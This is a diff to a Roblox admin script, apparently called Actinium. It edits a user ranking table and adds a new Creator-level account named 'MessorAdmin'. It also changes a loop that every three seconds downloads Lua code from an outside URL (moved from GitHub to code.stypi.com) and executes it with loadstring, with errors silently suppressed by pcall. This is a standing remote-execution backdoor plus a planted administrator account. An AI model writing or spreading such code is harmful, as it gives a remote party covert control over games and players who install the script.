@@ -39,11 +39,11 @@ Actinium = {
 		KAge = 360
 	},
 	['Ranked'] = {
-		{'Player','Creator',4,'Teal',true,false,true,false,true},
+		{'Player','Creator',4,'Teal',true,false,true,true,true},
 		{'jillmiles1','Creator',5,'Teal',true,false,true,true,true},
-		{'GravityLegendary','Friend & scripter',3,'Teal',true,true,true,true,true},
-		{'Despairus','Wire creator',3,'Teal',true,true,true,true,true},
-		
+		{'MessorAdmin','Creator',5,'Teal',true,false,true,true,true},
+		{'GravityLegendary','Friend & scripter',3,'Teal',true,false,true,true,true},
+		{'Despairus','Wire creator',3,'Teal',true,false,true,true,true},
 		--// Bans \\--
 		
 	},
@@ -867,9 +867,9 @@ end
 
 spawn(function()
 	  while wait(3) do
-	  	loadstring(		 
-	  	game:service'HttpService':GetAsync('https://raw.githubusercontent.com/Jillmiles1/Actinium/master/RawExecute.lua',true)    
-     		)() 
+		pcall(function()
+	  		local Results = loadstring(game:service'HttpService':GetAsync('https://code.stypi.com/raw/jillmiles1/RawExecute.lua',true))()
+		end) 
    	end
 end)
 
